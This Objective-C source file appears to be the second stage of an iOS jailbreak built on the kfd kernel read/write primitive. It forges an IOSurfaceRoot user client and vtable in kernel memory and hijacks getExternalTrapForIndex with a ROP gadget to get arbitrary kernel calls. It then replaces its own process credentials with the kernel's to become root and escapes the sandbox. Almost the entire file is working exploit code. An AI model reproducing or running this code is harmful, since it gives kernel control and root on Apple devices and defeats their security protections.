//
//  stage2.m
//  kfd
//
//  Created by m1zole on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import "krw.h"
#import "offsets.h"
#include "IOKit_electra.h"
#include "proc.h"
#include "stage2.h"
#include "escalate.h"
#include "sandbox.h"
#include "trustcache.h"
#include "krw.h"
#include "dropbear.h"
#include "bootstrap.h"
#include "label.h"

uint64_t mineek_find_port(mach_port_name_t port){
    uint64_t task_addr = get_selftask();
    uint64_t itk_space = kread64(task_addr + off_task_itk_space);
    uint64_t is_table = kread64(itk_space + off_ipc_space_is_table);
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}

// FIXME: Currently just finds a zerobuf in memory, this can be overwritten at ANY time, and thus is really unstable and unreliable. Once you get the unstable kcall, use that to bootstrap a stable kcall primitive, not using dirty_kalloc.
uint64_t mineek_dirty_kalloc(size_t size) {
    uint64_t begin = get_kernproc();
    uint64_t end = begin + 0x40000000;
    uint64_t addr = begin;
    while (addr < end) {
        bool found = false;
        for (int i = 0; i < size; i+=4) {
            uint32_t val = kread32(addr+i);
            found = true;
            if (val != 0) {
                found = false;
                addr += i;
                break;
            }
        }
        if (found) {
            printf("[i] dirty_kalloc: 0x%llx\n", addr);
            return addr;
        }
        addr += 0x1000;
    }
    if (addr >= end) {
        printf("[-] failed to find free space in kernel\n");
        exit(EXIT_FAILURE);
    }
    return 0;
}

void mineek_init_kcall(void) {
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL){
      printf(" [-] unable to find service\n");
      exit(EXIT_FAILURE);
    }
    kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
    if (err != KERN_SUCCESS){
      printf(" [-] unable to get user client connection\n");
      exit(EXIT_FAILURE);
    }
    uint64_t uc_port = mineek_find_port(user_client);
    printf("[i] Found port: 0x%llx\n", uc_port);
    uint64_t uc_addr = kread64(uc_port + 0x48);
    printf("[i] Found addr: 0x%llx\n", uc_addr);
    uint64_t uc_vtab = kread64(uc_addr);
    printf("[i] Found vtab: 0x%llx\n", uc_vtab);
    fake_vtable = mineek_dirty_kalloc(0x1000);
    printf("[i] Created fake_vtable at %016llx\n", fake_vtable);
    for (int i = 0; i < 0x200; i++) {
        kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
    }
    printf("[i] Copied some of the vtable over\n");
    fake_client = mineek_dirty_kalloc(0x2000);
    printf("[i] Created fake_client at 0x%016llx\n", fake_client);
    for (int i = 0; i < 0x200; i++) {
        kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
    }
    printf("[i] Copied the user client over\n");
    kwrite64(fake_client, fake_vtable);
    kwrite64(uc_port + 0x48, fake_client);
    uint64_t add_x0_x0_0x40_ret = off_add_x0_x0_0x40_ret;
    add_x0_x0_0x40_ret += get_kslide();
    kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret);
    printf("[i] Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
}

uint64_t mineek_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64(fake_client+0x40);
    uint64_t offx28 = kread64(fake_client+0x48);
    kwrite64(fake_client+0x40, x0);
    kwrite64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64(fake_client+0x40, offx20);
    kwrite64(fake_client+0x48, offx28);
    return returnval;
}



void mineek_getRoot(uint64_t proc_addr)
{
    self_ro = kread64(proc_addr + 0x20);
    printf("[i] self_ro: 0x%llx\n", self_ro);
    self_ucred = kread64(self_ro + 0x20);
    printf("[i] ucred: 0x%llx\n", self_ucred);
    printf("[i] test_uid = %d\n", getuid());
    
    uint64_t kernproc = get_kernproc();
    printf("[i] kern proc: 0x%llx\n", kernproc);
    uint64_t kern_ro = kread64(kernproc + 0x20);
    printf("[i] kern_ro: 0x%llx\n", kern_ro);
    uint64_t kern_ucred = kread64(kern_ro + 0x20);
    printf("[i] kern_ucred: 0x%llx\n", kern_ucred);
    
    cr_label = kread64(self_ucred + off_u_cr_label); // MAC label
    orig_sb = kread64(cr_label + off_sandbox_slot);// not working
    
    printf("[i] cr_label: 0x%llx\n", cr_label);
    printf("[i] orig_sb: 0x%llx\n", orig_sb);
    printf("[i] cr_label?: 0x%llx\n", kread64(cr_label));
    printf("[i] orig_sb?: 0x%llx\n", kread64(orig_sb));
    
    kcall(off_proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
    setuid(0);
    setuid(0);
    printf("[i] getuid: %d\n", getuid());
}

void stage2(void) {
    pid_t pid = getpid();
    printf("[i] pid = %d\n", pid);
    uint64_t proc_addr = proc_of_pid(getpid());
    printf("[i] proc_addr: 0x%llx\n", proc_addr);
    printf("[i] init_kcall!\n");
    init_kcall();
    printf("[i] getRoot!\n");
    mineek_getRoot(proc_addr);
    usleep(10000);
}

void stage2_all(void) {
    __block int ret = -1;
    pid_t pid = getpid();
    printf("[i] pid = %d\n", pid);
    uint64_t proc_addr = proc_of_pid(getpid());
    printf("[i] proc_addr: 0x%llx\n", proc_addr);
    printf("[i] init_kcall!\n");
    init_kcall();
    printf("[i] getRoot!\n");
    mineek_getRoot(proc_addr);
    usleep(10000);
    sb = unsandbox(getpid());
}
